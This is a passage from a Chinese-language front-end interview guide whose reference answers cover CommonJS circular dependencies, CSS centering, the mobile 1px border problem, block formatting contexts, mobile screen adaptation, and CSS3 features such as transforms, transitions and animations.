odd(n-1);\n&#125;\n//odd.js\nvar even = require('./even.js');\n\nmodule.exports = function odd(n)&#123;\n    return n != 0 &amp;&amp; even(n-1);\n&#125;\n//index.js\nvar even = require('./even.js');\n\nvar x = even(5);\nconsole.log(x);\n\nvar y = even(5);\nconsole.log(y);\n\n执行index.js，输出结果如下：\n$ babel-node index.js\n1\n&#x2F;Users&#x2F;name&#x2F;Projects&#x2F;node&#x2F;ES6&#x2F;odd.1.js:6\n    return n !&#x3D; 0 &amp;&amp; even(n - 1);\n                     ^\n\nTypeError: even is not a function\n    at odd (&#x2F;Users&#x2F;name&#x2F;Projects&#x2F;node&#x2F;ES6&#x2F;odd.1.js:4:22)\n\n\n\n\n\nCss:1、未知高度元素垂直居中、垂直居中的实现方式有哪些？参考答案：\n1、绝对定位+css3 transform:translate(-50%，-50%)\n.wrap&#123;\n  position:relative;\n&#125;\n.child&#123;\n  position: absolute;\n  top:50%;\n  left:50%;\n  -webkit-transform:translate(-50%,-50%);\n&#125;\n\n2、css3 的flex布局\n.wrap&#123;\n  display:flex;\n  justify-content:center;\n&#125;\n.child&#123;\n  align-self:center;\n&#125;\n\n3、table布局\n&lt;div class=\"wrap\">\n   &lt;div class=\"child\">\n          &lt;div>sadgsdgasgd&lt;/div>\n   &lt;/div>\n&lt;/div>\n.wrap&#123;\n  display:table;\n  text-align:center;\n&#125;\n.child&#123;\n  background:#ccc;\n  display:table-cell;\n  vertical-align:middle;\n&#125;\n.child div&#123;\n    width:300px;\n    height:150px;\n    background:red;\n    margin:0 auto;\n&#125;\n\n\n\n2、padding , margin 百分比单位依据参考答案：\n在CSS 盒模型中，依据CSS2.2文档，margin与padding的百分比指定值时，一律参考包含盒的宽度。示例：\n.father&#123;\n    height: 100px;\n    width: 200px;\n    border: solid;\n&#125;\n\n.son&#123;\n    margin: 20%;\n    padding: 20%;\n    width: 50%;\n    height: 50%;\n&#125;\n\n如下图，包括padding-top&#x2F;bottom,margin-top&#x2F;bottom在内，所有padding和margin均是参考的包含块的宽度，故它们的值为200px * 20% &#x3D; 40px。\n3、移动端 1px 问题参考答案：\n问题：1px 的边框，在高清屏下，移动端的1px 会很粗\n产生原因\n那么为什么会产生这个问题呢？主要是跟一个东西有关，DPR(devicePixelRatio) 设备像素比，它是默认缩放为100%的情况下，设备像素和CSS像素的比值。\nwindow.devicePixelRatio&#x3D;物理像素 &#x2F;CSS像素\n复制代码\n\n目前主流的屏幕DPR&#x3D;2 （iPhone 8）,或者3 （iPhone 8 Plus）。拿2倍屏来说，设备的物理像素要实现1像素，而DPR&#x3D;2，所以css 像素只能是 0.5。一般设计稿是按照750来设计的，它上面的1px是以750来参照的，而我们写css样式是以设备375为参照的，所以我们应该写的0.5px就好了啊！ 试过了就知道，iOS 8+系统支持，安卓系统不支持。\n解决方案\n\nWWDC对iOS统给出的方案\n在 WWDC大会上，给出来了1px方案，当写 0.5px的时候，就会显示一个物理像素宽度的 border，而不是一个css像素的 border。 所以在iOS下，你可以这样写。\nborder:0.5px solid #E5E5E5\n\n可能你会问为什么在3倍屏下，不是0.3333px 这样的？经过测试，在Chrome上模拟iPhone 8Plus，发现小于0.46px的时候是显示不出来。\n总结：\n\n优点：简单，没有副作用\n缺点：支持iOS 8+，不支持安卓。后期安卓follow就好了。\n\n\n使用边框图片\nborder: 1px solid transparent;\nborder-image: url('./../../image/96.jpg') 2 repeat;\n\n总结：\n\n优点：没有副作用\n缺点：border颜色变了就得重新制作图片；圆角会比较模糊。\n\n\n使用box-shadow实现\nbox-shadow: 0  -1px 1px -1px #e5e5e5,   //上边线\n            1px  0  1px -1px #e5e5e5,   //右边线\n            0  1px  1px -1px #e5e5e5,   //下边线\n            -1px 0  1px -1px #e5e5e5;   //左边线\n\n 总结\n\n优点：使用简单，圆角也可以实现\n缺点：模拟的实现方法，仔细看谁看不出来这是阴影不是边框。\n\n\n使用伪元素\n1条border\n.setOnePx&#123;\n  position: relative;\n  &amp;::after&#123;\n    position: absolute;\n    content: '';\n    background-color: #e5e5e5;\n    display: block;\n    width: 100%;\n    height: 1px; /*no*/\n    transform: scale(1, 0.5);\n    top: 0;\n    left: 0;\n  &#125;\n&#125;\n\n可以看到，将伪元素设置绝对定位，并且和父元素的左上角对齐，将width 设置100%，height设置为1px，然后进行在Y方向缩小0.5倍。\n4 条border\n.setBorderAll&#123;\n     position: relative;\n       &amp;:after&#123;\n           content:\" \";\n           position:absolute;\n           top: 0;\n           left: 0;\n           width: 200%;\n           height: 200%;\n           transform: scale(0.5);\n           transform-origin: left top;\n           box-sizing: border-box;\n           border: 1px solid #E5E5E5;\n           border-radius: 4px;\n      &#125;\n    &#125;\n\n同样为伪元素设置绝对定位，并且和父元素左上角对其。将伪元素的长和宽先放大2倍，然后再设置一个边框，以左上角为中心，缩放到原来的0.5倍\n总结：\n\n优点：全机型兼容，实现了真正的1px，而且可以圆角。\n缺点：暂用了after 伪元素，可能影响清除浮动。\n\n\n设置viewport的scale值\n这个解决方案是利用viewport+rem+js 实现的。\n&lt;html>\n  &lt;head>\n      &lt;title>1px question&lt;/title>\n      &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\">\n      &lt;meta name=\"viewport\" id=\"WebViewport\" content=\"initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no\">        \n      &lt;style>\n          html &#123;\n              font-size: 1px;\n          &#125;            \n          * &#123;\n              padding: 0;\n              margin: 0;\n          &#125;\n          .top_b &#123;\n              border-bottom: 1px solid #E5E5E5;\n          &#125;\n\n          .a,.b &#123;\n                      box-sizing: border-box;\n              margin-top: 1rem;\n              padding: 1rem;                \n              font-size: 1.4rem;\n          &#125;\n\n          .a &#123;\n              width: 100%;\n          &#125;\n\n          .b &#123;\n              background: #f5f5f5;\n              width: 100%;\n          &#125;\n      &lt;/style>\n      &lt;script>\n          var viewport = document.querySelector(\"meta[name=viewport]\");\n          //下面是根据设备像素设置viewport\n          if (window.devicePixelRatio == 1) &#123;\n              viewport.setAttribute('content', 'width=device-width,initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no');\n          &#125;\n          if (window.devicePixelRatio == 2) &#123;\n              viewport.setAttribute('content', 'width=device-width,initial-scale=0.5, maximum-scale=0.5, minimum-scale=0.5, user-scalable=no');\n          &#125;\n          if (window.devicePixelRatio == 3) &#123;\n              viewport.setAttribute('content', 'width=device-width,initial-scale=0.3333333333333333, maximum-scale=0.3333333333333333, minimum-scale=0.3333333333333333, user-scalable=no');\n          &#125;\n          var docEl = document.documentElement;\n          var fontsize = 32* (docEl.clientWidth / 750) + 'px';\n          docEl.style.fontSize = fontsize;\n      &lt;/script>\n  &lt;/head>\n  &lt;body>\n      &lt;div class=\"top_b a\">下面的底边宽度是虚拟1像素的&lt;/div>\n      &lt;div class=\"b\">上面的边框宽度是虚拟1像素的&lt;/div>\n  &lt;/body>\n&lt;/html>\n\n总结\n\n优点：全机型兼容，直接写1px不能再方便\n缺点：适用于新的项目，老项目可能改动大\n\n\n\n4、BFC参考答案：\n\n简介\n在解释BFC之前，先说一下文档流。我们常说的文档流其实分为定位流、浮动流、普通流三种。而普通流其实就是指BFC中的FC。FC(Formatting Context)，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用。常见的FC有BFC、IFC，还有GFC和FFC。\nBFC(Block Formatting Context)块级格式化上下文，是用于布局块级盒子的一块渲染区域。MDN上的解释：BFC是Web页面 CSS 视觉渲染的一部分，用于决定块盒子的布局及浮动相互影响范围的一个区域。\n注意：一个BFC的范围包含创建该上下文元素的所有子元素，但不包括创建了新BFC的子元素的内部元素。这从另一方角度说明，一个元素不能同时存在于两个BFC中。因为如果一个元素能够同时处于两个BFC中，那么就意味着这个元素能与两个BFC中的元素发生作用，就违反了BFC的隔离作用。\n\n三种文档流的定位方案\n常规流(Normal flow)\n\n在常规流中，盒一个接着一个排列;\n在块级格式化上下文里面， 它们竖着排列；\n在行内格式化上下文里面， 它们横着排列;\n当position为static或relative，并且float为none时会触发常规流；\n对于静态定位(static positioning)，position: static，盒的位置是常规流布局里的位置；\n对于相对定位(relative positioning)，position: relative，盒偏移位置由top、bottom、left、right属性定义。即使有偏移，仍然保留原有的位置，其它常规流不能占用这个位置。\n\n浮动(Floats)\n\n左浮动元素尽量靠左、靠上，右浮动同理\n这导致常规流环绕在它的周边，除非设置 clear 属性\n浮动元素不会影响块级元素的布局\n但浮动元素会影响行内元素的布局，让其围绕在自己周围，撑大父级元素，从而间接影响块级元素布局\n最高点不会超过当前行的最高点、它前面的浮动元素的最高点\n不超过它的包含块，除非元素本身已经比包含块更宽\n行内元素出现在左浮动元素的右边和右浮动元素的左边，左浮动元素的左边和右浮动元素的右边是不会摆放浮动元素的\n\n绝对定位(Absolute positioning)\n\n绝对定位方案，盒从常规流中被移除，不影响常规流的布局；\n它的定位相对于它的包含块，相关CSS属性：top、bottom、left、right；\n如果元素的属性position为absolute或fixed，它是绝对定位元素；\n对于position: absolute，元素定位将相对于上级元素中最近的一个relative、fixed、absolute，如果没有则相对于body；\n\n\nBFC触发方式\n3.1 根元素，即HTML标签\n3.2 浮动元素：float值为left、right\n3.3 overflow值不为 visible，为 auto、scroll、hidden\n3.4 display值为 inline-block、table-cell、table-caption、table、inline-table、flex、inline-flex、grid、inline-grid\n3.5 定位元素：position值为 absolute、fixed\n注意：display:table也可以生成BFC的原因在于Table会默认生成一个匿名的table-cell，是这个匿名的table-cell生成了BFC。\n\n约束规则\n浏览器对BFC区域的约束规则：\n\n生成BFC元素的子元素会一个接一个的放置。\n垂直方向上他们的起点是一个包含块的顶部，两个相邻子元素之间的垂直距离取决于元素的margin特性。在BFC中相邻的块级元素的外边距会折叠(Mastering margin collapsing)\n生成BFC元素的子元素中，每一个子元素左外边距与包含块的左边界相接触（对于从右到左的格式化，右外边距接触右边界），即使浮动元素也是如此（尽管子元素的内容区域会由于浮动而压缩），除非这个子元素也创建了一个新的BFC（如它自身也是一个浮动元素）。\n\n规则解读：\n\n内部的Box会在垂直方向上一个接一个的放置\n内部的Box垂直方向上的距离由margin决定。（完整的说法是：属于同一个BFC的两个相邻Box的margin会发生折叠，不同BFC不会发生折叠。）\n每个元素的左外边距与包含块的左边界相接触（从左向右），即使浮动元素也是如此。（这说明BFC中子元素不会超出他的包含块，而position为absolute的元素可以超出他的包含块边界）\nBFC的区域不会与float的元素区域重叠\n计算BFC的高度时，浮动子元素也参与计算\n\n\n作用\nBFC是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素，反之亦然。我们可以利用BFC的这个特性来做很多事。\n5.1 阻止元素被浮动元素覆盖\n 一个正常文档流的block元素可能被一个float元素覆盖，挤占正常文档流，因此可以设置一个元素的float、 display、position值等方式触发BFC，以阻止被浮动盒子覆盖。\n5.2 可以包含浮动元素\n 通过改变包含浮动子元素的父盒子的属性值，触发BFC，以此来包含子元素的浮动盒子。\n5.3 阻止因为浏览器因为四舍五入造成的多列布局换行的情况\n 有时候因为多列布局采用小数点位的width导致因为浏览器因为四舍五入造成的换行的情况，可以在最后一 列触发BFC的形式来阻止换行的发生。比如下面栗子的特殊情况\n5.4 阻止相邻元素的margin合并\n 属于同一个BFC的两个相邻块级子元素的上下margin会发生重叠，(设置writing-mode:tb-rl时，水平 margin会发生重叠)。所以当两个相邻块级子元素分属于不同的BFC时可以阻止margin重叠。这里给任一个相邻块级盒子的外面包一个div，通过改变此div的属性使两个原盒子分属于两个不同的BFC，以此来阻止margin重叠。\n\n\n5、移动端适配方案参考答案：\n适配思路\n设计稿（750*1334） —&gt; 开发 —&gt; 适配不同的手机屏幕，使其显得合理\n原则\n\n开发时方便，写代码时设置的值要和标注的 160px 相关\n方案要适配大多数手机屏幕，并且无 BUG\n用户体验要好，页面看着没有不适感\n\n思路\n\n写页面时，按照设计稿写固定宽度，最后再统一缩放处理，在不同手机上都能用\n按照设计稿的标准开发页面，在手机上部分内容根据屏幕宽度等比缩放，部分内容按需要变化，需要缩放的元素使用 rem, vw 相对单位，不需要缩放的使用 px\n固定尺寸+弹性布局，不需要缩放\n\nviewport 适配\n根据设计稿标准（750px 宽度）开发页面，写完后页面及元素自动缩小，适配 375 宽度的屏幕\n在 head 里设置如下代码\n&lt;meta name=\"viewport\" content=\"width=750,initial-scale=0.5\">\n\ninitial-scale &#x3D; 屏幕的宽度 &#x2F; 设计稿的宽度\n为了适配其他屏幕，需要动态的设置 initial-scale 的值\n&lt;head>\n  &lt;script>\n    const WIDTH = 750\n    const mobileAdapter = () => &#123;\n      let scale = screen.width / WIDTH\n      let content = `width=$&#123;WIDTH&#125;, initial-scale=$&#123;scale&#125;, maximum-scale=$&#123;scale&#125;, minimum-scale=$&#123;scale&#125;`\n      let meta = document.querySelector('meta[name=viewport]')\n      if (!meta) &#123;\n        meta = document.createElement('meta')\n        meta.setAttribute('name', 'viewport')\n        document.head.appendChild(meta)\n      &#125;\n      meta.setAttribute('content',content)\n    &#125;\n    mobileAdapter()\n    window.onorientationchange = mobileAdapter //屏幕翻转时再次执行\n  &lt;/script>\n&lt;/head>\n\n缺点就是边线问题，不同尺寸下，边线的粗细是不一样的（等比缩放后），全部元素都是等比缩放，实际显示效果可能不太好\nvw 适配（部分等比缩放）\n\n开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标注是基于此宽度标注）\n开始开发，对设计稿的标注进行转换，把px换成vw。比如页面元素字体标注的大小是32px，换成vw为 (100&#x2F;750)*32 vw\n对于需要等比缩放的元素，CSS使用转换后的单位\n对于不需要缩放的元素，比如边框阴影，使用固定单位px\n\n关于换算，为了开发方便，利用自定义属性，CSS变量\n&lt;head>\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1\">\n  &lt;script>\n    const WIDTH = 750\n    //:root &#123; --width: 0.133333 &#125; 1像素等于多少 vw\n    document.documentElement.style.setProperty('--width', (100 / WIDTH)) \n  &lt;/script>\n&lt;/head>\n\n注意此时，meta 里就不要去设置缩放了\n业务代码里就可以写\nheader &#123;\n  font-size: calc(28vw * var(--width))\n&#125;\n\n实现了按需缩放\nrem 适配\n\n开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标是基于此宽度标注）\n开始开发，对设计稿的标注进行转换\n对于需要等比缩放的元素，CSS使用转换后的单位\n对于不需要缩放的元素，比如边框阴影，使用固定单位px\n\n假设设计稿的某个字体大小是 40px, 手机屏幕上的字体大小应为 420&#x2F;750*40 &#x3D; 22.4px (体验好)，换算成 rem（相对于 html 根节点，假设 html 的 font-size &#x3D; 100px,）则这个字体大小为 0.224 rem\n写样式时，对应的字体设置为 0.224 rem 即可，其他元素尺寸也做换算…\n但是有问题\n举个 ，设计稿的标注 是40px，写页面时还得去做计算，很麻烦（全部都要计算）\n能不能规定一下，看到 40px ,就应该写 40&#x2F;100 &#x3D; 0.4 rem,这样看到就知道写多少了（不用计算），此时的 html 的 font-size 就不能是 100px 了，应该为 (420*100)&#x2F;750 &#x3D; 56px，100为我们要规定的那个参数\n根据不同屏幕宽度，设置 html 的 font-size 值\n&lt;head>\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1\">\n  &lt;script>\n    const WIDTH = 750 //设计稿尺寸\n    const setView = () => &#123;\n      document.documentElement.style.fontSize = (100 * screen.width / WIDTH) + 'px'\n    &#125;\n    window.onorientationchange = setView\n    setView()\n  &lt;/script>\n&lt;/head>\n\n对于需要等比缩放的元素，CSS使用转换后的单位\nheader &#123;\n  font-size: .28rem;\n&#125;\n\n对于不需要缩放的元素，比如边框阴影，使用固定单位px\nheader > span.active &#123;\n  color: #fff;\n  border-bottom: 2px solid rgba(255, 255, 255, 0.3);\n&#125;\n\n假设 html 的 font size &#x3D; 1px 的话，就可以写 28 rem 了，更方便了，但是浏览器对字体大小有限制，设为 1px 的话，在浏览器中是失效的，会以 12px（或者其他值） 做一个计算 , 就会得到一个很夸张的结果，所以可以把 html 写的大一些\n使用 sass 库时\nJS 处理还是一样的，但看着好看些\n@function px2rem($px) &#123;\n  @return $px * 1rem / 100;\n&#125;\n\nheader &#123;\n  font-size: px2rem(28);\n&#125;\n\n以上的三种适配方案，都是等比缩放，放到 ipad 上时（设计稿以手机屏幕设计的），页面元素会很大很丑，有些场景下，并不需要页面整体缩放（viewport 自动处理的也很好了），所以有时只需要合理的布局即可。\n弹性盒适配（合理布局）\n&lt;meta name=\"viewport\" content=\"width=device-width\">\n\n使用 flex 布局\nsection &#123;\n  display: flex;\n&#125;\n\n总结一下，什么样的页面需要做适配（等比缩放）呢\n\n页面中的布局是栅格化的\n\n换了屏幕后，到底有多宽多高很难去做设置，整体的都需要改变，所以需要整体的缩放\n\n头屏大图，宽度自适应，高度固定的话，对于不同的屏幕，形状就会发生改变（放到ipad上就变成长条了），宽度变化后，高度也要保持等比例变化\n\n以上所有的适配都是宽度的适配，但是在某些场景下，也会出现高度的适配\n比如大屏，需要适配很多的电视尺寸，要求撑满屏幕，不能有滚动条，此时若换个屏幕\n此时需要考虑小元素用 vh, 宽和高都用 vh 去表示，中间的大块去自适应，这就做到了大屏的适配，屏幕变小了，整体变小了（体验更好），中间这块撑满了屏幕\n对于更复杂的场景，需要更灵活考虑，没有一种适配方式可以囊括所有场景。\n6、css3新特性参考答案：\n\nCSS3 边框\n在 css3 中新增的边框属性如下：\n创建圆角\n语法： border-radius : length length;\n length： 由浮点数字和单位标识符组成的长度值（如：20px）。不可为负值，如果为负值则与0展示效果一样。第一个值设置其水平半径，第二个值设置其垂直半径，如果第二个值省略则默认第二个值等于第一个值。\ndiv&#123;\n  border: 1px solid;\n  /* 设置每个圆角水平半径和垂直半径都为30px */\n  border-radius: 30px;\n&#125;\n\nborder-radius 是4个角的缩写方法。四个角的表示顺序与border类似按照border-top-left-radius、border-top-right-radius、border-bottom-right-radius、border-bottom-left-radius的顺序来设置：\ndiv&#123;\n  border: 1px solid;\n  /* 如果 / 前后的值都存在，那么 / 前面的值设置其水平半径，/ 后面值设置其垂直半径，如果没有 / ，则水平和垂直半径相等 */\n  border-radius: 10px 15px 20px 30px / 20px 30px 10px 15px;\n\n  /* 上面写法等价于下面的写法，第一个值是水平半径，第二个值是垂直半径 */\n  border-top-left-radius: 10px 20px;\n  border-top-right-radius: 15px 30px;\n  border-bottom-right-radius: 20px 10px;\n  border-bottom-left-radius: 30px 15px;\n&#125;\n\nborder-radius 指定不同数量的值遵循对角相等的原则，即指定了值的取指定值，没有指定值的与对角值相等，对角相等模型\n边框阴影\n通过属性box-shadow 向边框添加阴影。\n语法： &#123;box-shadow : [inset]  x-offset  y-offset  blur-radius  extension-radius  spread-radiuscolor&#125;\n说明：对象选择器 {box-shadow:[投影方式] X轴偏移量 Y轴偏移量 模糊半径 阴影扩展半径 阴影颜色}\ndiv&#123;\n  /* 内阴影，向右偏移10px，向下偏移10px，模糊半径5px，阴影缩小10px */\n  box-shadow: inset 10px 10px 5px -10px #888888;\n&#125;\n\n边框图片\n语法：\nborder-image : border-image-source || border-image-slice [ / border-image-width] || border-image-repeat\nborder-image ： none | image [ number | percentage]&#123;1,4&#125; [ / border-width&gt;&#123;1,4&#125; ] ? [ stretch | repeat | round ]&#123;0,2&#125;\ndiv&#123;\n  border-image:url(border.png) 30 30 round;\n\n  border-image: url(border.png) 20/10px repeat;\n&#125;\n\nCSS3 背景\n\n\nbackground-size 属性\n在 CSS3 之前，背景图片的尺寸是由图片的实际尺寸决定的。在 CSS3 中，可以设置背景图片的尺寸，这就允许我们在不同的环境中重复使用背景图片。可以像素或百分比规定尺寸。如果以百分比规定尺寸，那么尺寸相对于父元素的宽度和高度。\ndiv&#123;\n  background:url(bg_flower.gif);\n  /* 通过像素规定尺寸 */\n  background-size:63px 100px;\n\n  /* 通过百分比规定尺寸 */\n  background-size:100% 50%;\n  background-repeat:no-repeat;\n&#125;\n\nbackground-origin 属性\n规定背景图片的定位区域，背景图片可以放置于 content-box、padding-box 或 border-box 区域，\ndiv&#123;\n  background:url(bg_flower.gif);\n  background-repeat:no-repeat;\n  background-size:100% 100%;\n  /* 规定背景图片的定位区域 */\n  background-origin:content-box;\n&#125;\n\nbackground-clip 属性\n与background-origin 属性相似，规定背景颜色的绘制区域，区域划分与background-origin 属性相同。\ndiv&#123;\n  background-color:yellow;\n  background-clip:content-box;\n&#125;\n\nCSS3 多重背景图片\nCSS3 允许为元素设置多个背景图像\nbody&#123;\n  background-image:url(bg_flower.gif),url(bg_flower_2.gif);\n&#125;\n\n\nCSS3 文本效果\n\ntext-shadow 属性\n给为本添加阴影，能够设置水平阴影、垂直阴影、模糊距离，以及阴影的颜色。\nh1&#123;\n  text-shadow: 5px 5px 5px #FF0000;\n&#125;\n\ntext-wrap 属性\n设置区域内的自动换行。\n语法：text-wrap: normal | none | unrestricted | suppress | break-word;\n/* 允许对长单词进行拆分，并换行到下一行 */\np &#123;word-wrap:break-word;&#125;\n\n\n\n\n值\n描述\n\n\n\nnormal\n只在允许的换行点进行换行。\n\n\nnone\n不换行。元素无法容纳的文本会溢出。\n\n\nbreak-word\n在任意两个字符间换行。\n\n\nsuppress\n压缩元素中的换行。浏览器只在行中没有其他有效换行点时进行换行。\n\n\n\nCSS3 字体\n\n字体定义\n 在 CSS3 之前，web 设计师必须使用已在用户计算机上安装好的字体。但是通过 CSS3，web 设计师可以使用他 们喜欢的任意字体。当找到或购买到希望使用的字体时，可将该字体文件存放到 web 服务器上，它会在需要时 被自动下载到用户的计算机上。字体需要在 CSS3 @font-face 规则中定义。\n/* 定义字体 */\n@font-face&#123;\n  font-family: myFont;\n  src: url('Sansation_Light.ttf'),\n       url('Sansation_Light.eot');     /* IE9+ */\n&#125;\n\ndiv&#123;\n  font-family:myFont;\n&#125;\n\n使用粗体字体\n“Sansation_Light.ttf”文件 是定义的正常字体，”Sansation_Bold.ttf” 是另一个字体文件，它包含了 Sansation 字体的粗体字符。只要 font-family 为 “myFirstFont” 的文本需要显示为粗体，浏览器就会使用该字体。\n（其实没弄清楚这样处理的原因，经测试直接在html中通过 b 标签也可以实现加粗的效果）\n/* 定义正常字体 */\n@font-face&#123;\n  font-family: myFirstFont;\n  src: url('/example/css3/Sansation_Light.ttf'),\n       url('/example/css3/Sansation_Light.eot'); /* IE9+ */\n&#125;\n\n/* 定义粗体时使用的字体 */\n@font-face&#123;\n  font-family: myFirstFont;\n  src: url('/example/css3/Sansation_Bold.ttf'),\n       url('/example/css3/Sansation_Bold.eot'); /* IE9+ */\n  /* 标识属性 */\n  font-weight:bold;\n&#125;\n\ndiv&#123;\n  font-family:myFirstFont;\n&#125;\n\n\nCSS3 2D 转换\n\n通过 CSS3 转换，我们能够对元素进行移动、缩放、转动、拉长或拉伸，转换是使元素改变形状、尺寸和位置的一种效果。\ntranslate() 方法\n通过 translate(x , y) 方法，元素根据给定的 left（x 坐标） 和 top（y 坐标） 位置参数从其当前位置移动，x为正值向右移动，为负值向左移动；y为正值向下移动，为负值向上移动；\ndiv&#123;\n  transform: translate(50px,100px);\n  -ms-transform: translate(50px,100px);        /* IE 9 */\n  -webkit-transform: translate(50px,100px);     /* Safari and Chrome */\n  -o-transform: translate(50px,100px);         /* Opera */\n  -moz-transform: translate(50px,100px);        /* Firefox */\n&#125;\n\nrotate() 方法\n控制元素顺时针旋转给定的角度。为正值，元素将顺时针旋转。为负值，元素将逆时针旋转。\ndiv&#123;\n  transform: rotate(30deg);\n  -ms-transform: rotate(30deg);        /* IE 9 */\n  -webkit-transform: rotate(30deg);    /* Safari and Chrome */\n  -o-transform: rotate(30deg);         /* Opera */\n  -moz-transform: rotate(30deg);       /* Firefox */\n&#125;\n\nscale() 方法\n根据给定的宽度（X 轴）和高度（Y 轴）参数，控制元素的尺寸的增加、减少。\ndiv&#123;\n  transform: scale(2,4);\n  -ms-transform: scale(2,4);         /* IE 9 */\n  -webkit-transform: scale(2,4);     /* Safari 和 Chrome */\n  -o-transform: scale(2,4);         /* Opera */\n  -moz-transform: scale(2,4);       /* Firefox */\n&#125;\n\nskew() 方法\n根据给定的水平线（X 轴）和垂直线（Y 轴）参数设置元素翻转给定的角度。\n/* 设置围绕 X 轴把元素翻转 30 度，围绕 Y 轴翻转 20 度。 */\ndiv&#123;\n  transform: skew(30deg,20deg);\n  -ms-transform: skew(30deg,20deg);         /* IE 9 */\n  -webkit-transform: skew(30deg,20deg);     /* Safari and Chrome */\n  -o-transform: skew(30deg,20deg);          /* Opera */\n  -moz-transform: skew(30deg,20deg);        /* Firefox */\n&#125;\n\nmatrix() 方法\nmatrix() 方法把所有 2D 转换方法组合在一起。matrix() 方法需要六个参数，包含数学函数，允许旋转、缩放、移动以及倾斜元素。\n/* 使用 matrix 方法将 div 元素旋转 30 度 */\ndiv&#123;\n  transform:matrix(0.866,0.5,-0.5,0.866,0,0);\n  -ms-transform:matrix(0.866,0.5,-0.5,0.866,0,0);          /* IE 9 */\n  -moz-transform:matrix(0.866,0.5,-0.5,0.866,0,0);         /* Firefox */\n  -webkit-transform:matrix(0.866,0.5,-0.5,0.866,0,0);      /* Safari and Chrome */\n  -o-transform:matrix(0.866,0.5,-0.5,0.866,0,0);           /* Opera */\n&#125;\n\n2D Transform 方法汇总\n\n\n\n函数\n描述\n\n\n\nmatrix(n,n,n,n,n,n)\n定义 2D 转换，使用六个值的矩阵。\n\n\ntranslate(x,y)\n定义 2D 转换，沿着 X 和 Y 轴移动元素。\n\n\ntranslateX(n)\n定义 2D 转换，沿着 X 轴移动元素。\n\n\ntranslateY(n)\n定义 2D 转换，沿着 Y 轴移动元素。\n\n\nscale(x,y)\n定义 2D 缩放转换，改变元素的宽度和高度。\n\n\nscaleX(n)\n定义 2D 缩放转换，改变元素的宽度。\n\n\nscaleY(n)\n定义 2D 缩放转换，改变元素的高度。\n\n\nrotate(angle)\n定义 2D 旋转，在参数中规定角度。\n\n\nskew(x-angle,y-angle)\n定义 2D 倾斜转换，沿着 X 和 Y 轴。\n\n\nskewX(angle)\n定义 2D 倾斜转换，沿着 X 轴。\n\n\nskewY(angle)\n定义 2D 倾斜转换，沿着 Y 轴。\n\n\n\nCSS3 3D 转换\n\nCSS3 允许使用 3D 转换来对元素进行格式化\nrotateX() 方法\n/* 设置元素围绕其 X 轴以给定的度数进行旋转 */\ndiv&#123;\n  transform: rotateX(120deg);\n  -webkit-transform: rotateX(120deg);   /* Safari 和 Chrome */\n  -moz-transform: rotateX(120deg);  /* Firefox */\n&#125;\n\nrotateY() 旋转\n/* 设置元素围绕其 Y 轴以给定的度数进行旋转 */\ndiv&#123;\n  transform: rotateY(130deg);\n  -webkit-transform: rotateY(130deg);   /* Safari 和 Chrome */\n  -moz-transform: rotateY(130deg);  /* Firefox */\n&#125;\n\n\nCSS3 过渡\n通过 CSS3可以在不使用 Flash 动画或 JavaScript 的情况下，当元素从一种样式变换为另一种样式时为元素添加效果。\n要实现这一点，必须规定以下两项内容：\n\n设置添加过渡效果的 CSS 属性；\n设置过渡效果的时长；\n\n注意： 如果时长未设置，则不会有过渡效果，因为默认值是 0。\n\n\n单项改变\n/* 设置将变化效果添加在“宽度”上，时长为2秒；该时长在其他属性上并不适用 */\ndiv&#123;\n  transition: width 2s;\n  -moz-transition: width 2s;         /* Firefox 4 */\n  -webkit-transition: width 2s;      /* Safari 和 Chrome */\n  -o-transition: width 2s;           /* Opera */\n&#125;\n/* 配合在一起使用的效果就是当鼠标移上去的时候宽度变为300px，这个过程耗时2秒 */\ndiv:hover&#123;\n  width:300px;\n&#125;\n\n 注意： 当鼠标移出元素时，它会逐渐变回原来的样式。\n多项改变\n如需向多个样式添加过渡效果，请添加多个属性，由逗号隔开。\n/* 同时向宽度、高度和转换添加过渡效果 */\ndiv&#123;\n  transition: width 2s, height 2s, transform 2s;\n  -moz-transition: width 2s, height 2s, -moz-transform 2s;\n  -webkit-transition: width 2s, height 2s, -webkit-transform 2s;\n  -o-transition: width 2s, height 2s,-o-transform 2s;\n&#125;\n\n/* 当鼠标移上时宽度和高度都变成200px，同时旋转180度，每个属性变化都耗时2秒 */\ndiv:hover&#123;\n  width:200px;\n  height:200px;\n  transform:rotate(180deg);\n  -moz-transform:rotate(180deg);        /* Firefox 4 */\n  -webkit-transform:rotate(180deg);     /* Safari and Chrome */\n  -o-transform:rotate(180deg);          /* Opera */\n&#125;\n\n过渡属性详解\ntransition 是简写属性，\n语法： transition : transition-property | transition-duration | transition-timing-function | transition-delay;\n/* 设置在宽度上添加过渡效果，时长为1秒，过渡效果时间曲线为linear，等待2秒后开始过渡 */\ndiv&#123;\n  transition: width 1s linear 2s;\n  -moz-transition: width 1s linear 2s;       /* Firefox 4 */\n  -webkit-transition: width 1s linear 2s;    /* Safari and Chrome */\n  -o-transition: width 1s linear 2s;         /* Opera */\n&#125;\n\n\n\n\n属性\n描述\n\n\n\ntransition\n简写属性，用于在一个属性中设置四个过渡属性。\n\n\ntransition-property\n规定应用过渡的 CSS 属性的名称。\n\n\ntransition-duration\n定义过渡效果花费的时间。默认是 0。\n\n\ntransition-timing-function\n规定过渡效果的时间曲线。默认是 “ease”。\n\n\ntransition-delay\n规定过渡效果何时开始。默认是 0。\n\n\n\nCSS3 动画\n通过 CSS3可以创建动画，这些动画可以取代网页中的画图片、Flash 动画以及 JavaScript。\nCSS3 中通过@keyframes 规则来创建动画。在 @keyframes 中规定某项 CSS 样式，就能创建由当前样式（动画开始前的样式）逐渐改为新样式（需要变到的样式）的动画效果。\n\n\n通过from , to关键字设置动画发生的时间\n/* 通过@keyframes 创建动画 */\n@keyframes myfirst&#123;\n  from &#123;background: red;&#125;\n  to &#123;background: yellow;&#125;\n&#125;\n/* Firefox */\n@-moz-keyframes myfirst &#123;\n  